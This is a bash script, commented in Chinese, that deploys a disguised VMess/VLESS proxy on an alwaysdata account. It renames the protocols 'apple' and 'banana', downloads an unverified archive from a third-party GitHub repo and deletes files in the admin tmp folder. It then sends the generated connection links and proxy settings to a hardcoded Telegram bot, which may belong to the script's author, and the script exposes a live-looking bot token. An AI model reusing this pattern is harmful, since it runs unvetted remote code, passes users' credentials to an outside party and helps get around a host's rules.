#!/bin/bash
mkdir banana
TMP_DIRECTORY=$(mktemp -d)

APPLE_UUID='12345678-abcd-1234-efgh-1234567890ab'
APPLE_PATH='/index'
BANANA_PATH='/home'

URL=${USER}.alwaysdata.net

wget -q -O $TMP_DIRECTORY/config.json https://github.com/trendy31152x/disk/raw/refs/heads/main/config.json
wget -q -O $TMP_DIRECTORY/web.zip https://github.com/trendy31152x/disk/raw/refs/heads/main/tmp.zip
unzip -oq -d $HOME/banana $TMP_DIRECTORY/web.zip bananaweb geoip.dat geosite.dat

sed -i "s#UUID#$APPLE_UUID#g;s#VMESS_WSPATH#$APPLE_PATH#g;s#VLESS_WSPATH#$BANANA_PATH#g;s#10000#8300#g;s#20000#8400#g;s#127.0.0.1#0.0.0.0#g" $TMP_DIRECTORY/config.json
cp $TMP_DIRECTORY/config.json $HOME/banana
rm -rf $HOME/admin/tmp/*.*

Settings=$(cat <<-EOF

ProxyRequests off
ProxyPreserveHost On
ProxyPass "${APPLE_PATH}" "ws://services-${USER}.alwaysdata.net:8300${APPLE_PATH}"
ProxyPassReverse "${APPLE_PATH}" "ws://services-${USER}.alwaysdata.net:8300${APPLE_PATH}"
ProxyPass "${BANANA_PATH}" "ws://services-${USER}.alwaysdata.net:8400${BANANA_PATH}"
ProxyPassReverse "${BANANA_PATH}" "ws://services-${USER}.alwaysdata.net:8400${BANANA_PATH}"
EOF
)

applink=vmess://$(echo -n "{\"v\":\"2\",\"ps\":\"example.com\",\"add\":\"$URL\",\"port\":\"443\",\"id\":\"$APPLE_UUID\",\"aid\":\"0\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"$URL\",\"path\":\"$APPLE_PATH\",\"tls\":\"tls\"}" | base64 -w 0)
bananalink="banana://"$APPLE_UUID"@"$URL":443?encryption=none&security=tls&type=ws&host="$URL"&path="$BANANA_PATH"#alwaysdata"

qrencode -o $HOME/banana/A$APPLE_UUID.png $applink
qrencode -o $HOME/banana/B$APPLE_UUID.png $bananalink

mkdir -p $HOME/temp_dir/

cat > $HOME/temp_dir/corn.html<<-EOF
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Alwaysdata</title>
<style type="text/css">
body {
      font-family: Geneva, Arial, Helvetica, san-serif;
    }
div {
      margin: 0 auto;
      text-align: left;
      white-space: pre-wrap;
      word-break: break-all;
      max-width: 80%;
      margin-bottom: 10px;
}
</style>
</head>
<body bgcolor="#FFFFFF" text="#000000">
<div><font color="#009900"><b>APPLE协议链接：</b></font></div>
<div>$applink</div>
<div><font color="#009900"><b>APPLE协议二维码：</b></font></div>
<div><img src="/A$APPLE_UUID.png"></div>
<div><font color="#009900"><b>BANANA协议链接：</b></font></div>
<div>$bananalink</div>
<div><font color="#009900"><b>BANANA协议二维码：</b></font></div>
<div><img src="/B$APPLE_UUID.png"></div>
</body>
</html>
EOF

# 通过 Telegram Bot 发送文件和配置
TG_BOT_TOKEN="7597885092:AAGAdi6DUblmt-OEvYvoQSviQK_byn-wqvw"
TG_CHAT_ID="1914617587"

# 发送 corn.html 文件
curl -s -F document=@$HOME/temp_dir/corn.html "https://api.telegram.org/bot$TG_BOT_TOKEN/sendDocument" -F chat_id=$TG_CHAT_ID

# 发送配置文件
echo "$Settings" > $HOME/temp_dir/settings.txt
curl -s -F document=@$HOME/temp_dir/settings.txt "https://api.telegram.org/bot$TG_BOT_TOKEN/sendDocument" -F chat_id=$TG_CHAT_ID

# 清理临时文件
rm -f $HOME/temp_dir/corn.html
rm -f $HOME/temp_dir/settings.txt

clear

# 通知完成
echo "文件已发送并清理临时文件。"
